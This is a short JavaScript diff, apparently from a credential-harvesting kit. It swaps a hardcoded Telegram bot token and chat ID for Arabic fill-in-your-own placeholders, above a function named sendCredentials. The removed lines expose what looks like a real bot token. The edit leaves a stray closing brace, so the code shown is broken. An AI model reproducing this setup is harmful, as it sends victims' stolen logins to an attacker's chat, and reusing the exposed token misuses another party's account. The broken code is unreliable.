@@ -1,6 +1,5 @@
-const config = {
-    BOT_TOKEN: '8591713771:AAHsYoY0Be8gkmHVBF_ykWmpPt293_PNELk',
-    CHAT_ID: '8539996558'
+const BOT_TOKEN = "ضع_توكنك_هنا";
+const CHAT_ID = "ضع_رقمك_هنا";
 };
 
 async function sendCredentials(data) {
